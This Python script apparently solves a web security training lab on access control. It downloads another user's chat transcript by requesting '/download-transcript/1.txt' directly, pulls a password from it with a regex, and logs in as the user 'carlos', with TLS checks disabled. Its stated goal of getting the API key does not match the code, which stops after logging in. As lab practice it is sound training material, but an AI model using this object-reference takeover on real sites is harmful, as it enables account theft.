#####################
#    Libraries      #
#####################
import requests
import sys
import urllib3
import argparse
import re
from bs4 import BeautifulSoup as bs
import gc

#####################
#    Variables      #
#####################

## Disable requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

## Setup Proxies to future debugs
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(prog=f'\n[+] WebAcademy Access Control: Lab 7'
                                ,description="Description: Obtain the API key for the user 'carlos' and submit it as the solution"
                                ,epilog='----------------------- END ---------------------------')
parser.add_argument('-u', metavar ='--url', action='store', dest='url', type=str, required=True, help="Target's URL")

args = parser.parse_args()


#####################
#    Functions      #
#####################

def get_csrf(login_url,s):
    print("[+] Trying to get the CSRF token")
    r = s.get(login_url,verify=False, proxies=proxies)
    # take GET's response, find and return the csrf
    return bs(r.text,"html.parser").find("input", {'name':'csrf'})['value']

def log_in(url, s, username, password):
    login_url = url + "/login"
    csrf_token = get_csrf(login_url,s)
    if csrf_token:
        data = {
            'csrf':csrf_token,
            'username': username,
            'password': password
            }
        print("[+] Got the CSRF Token")
        print(f"[+] Trying to log in as {username} user")
        r = s.post(login_url, data=data, verify=False, proxies=proxies)
        if "Log out" in r.text:
            print(f"[+] Logged in as {username}")
            return r
        else:
            print(f"[-] Couldn't log in as {username}")
            print("[-] Exiting")
            gc.collect()
            sys.exit(-1)
    else:
        print("[-] Couldn't get the CSRF Token")
        print("[-] Exiting")
        gc.collect()
        sys.exit(-1)

def get_password(url, s):
    print("[+] Trying to get the password in transcription")
    transcription_url = url + "/download-transcript/1.txt"
    r = s.get(transcription_url, verify=False, proxies=proxies)
    password = re.search(r'password is (\w+)',r.text).group(1)
    if password:
        print("[+] Successfully retrieved the password")
        log_in(url,s,'carlos',password)
    else:
        print("[-] Couldn't retrieve the password")
        gc.collect()
        sys.exit(-1)

def main():
    
    if len(sys.argv) != 3:
        print(f"[+] Usage:\n\t{sys.argv[0]} -u <Lab's URL>")
        print(f"[+] Example:\n\t{sys.argv[0]} -u https://random-code.web-security-academy.net")
        gc.collect()
        sys.exit(-1)
    else:
        s = requests.Session()
        url = args.url.rstrip('/')
        get_password(url,s)

if __name__ == "__main__":
    main()